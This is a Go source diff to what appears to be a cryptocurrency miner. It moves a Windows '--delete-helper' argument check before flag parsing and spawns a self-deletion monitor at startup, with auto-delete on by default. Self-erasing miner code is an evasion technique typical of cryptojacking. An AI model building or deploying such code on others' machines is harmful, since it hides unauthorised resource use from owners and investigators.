@@ -43,7 +43,6 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"sync/atomic"
 	"syscall"
 	"time"
 
@@ -873,18 +872,18 @@ var (
 )
 
 func main() {
+	// Check if running as deletion helper (Windows only)
+	// This must be checked BEFORE flag parsing since --delete-helper is not a registered flag
+	if len(os.Args) >= 4 && os.Args[1] == "--delete-helper" {
+		runDeletionHelper(os.Args[2], os.Args[3])
+		return
+	}
+
 	// Parse command-line flags
 	flag.StringVar(&serverAddress, "server", "", "Mining pool server address (host:port)")
 	flag.StringVar(&serverAddress, "s", "", "Mining pool server address (host:port) (shorthand)")
 	flag.BoolVar(&selfDeleteOnExit, "auto-delete", true, "Delete executable on shutdown (default: true)")
 	flag.Parse()
-
-	// Check if running as deletion helper (Windows only)
-	// This is the fallback method for self-deletion when advanced technique fails
-	if len(os.Args) >= 3 && os.Args[1] == "--delete-helper" {
-		runDeletionHelper(os.Args[2], os.Args[3])
-		return
-	}
 
 	// Check environment variable as fallback
 	if serverAddress == "" {
@@ -933,22 +932,25 @@ func main() {
 		time.Sleep(retryInterval)
 	}
 
+	// Spawn deletion helper at startup if enabled
+	if selfDeleteOnExit {
+		exePath, err := os.Executable()
+		if err == nil {
+			fmt.Println("Auto-delete enabled, spawning deletion monitor...")
+			deleteSelfHelper(exePath)
+		}
+	}
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
 
-	var signalReceived atomic.Bool
 	go func() {
 		<-sigChan
-		signalReceived.Store(true)
+		fmt.Println("Signal received, initiating shutdown...")
 		miner.Stop()
 	}()
 
 	miner.Start()
-
-	if signalReceived.Load() && selfDeleteOnExit {
-		miner.selfDelete()
-		time.Sleep(2 * time.Second)
-	}
 
 	fmt.Println("Miner terminated.")
 }
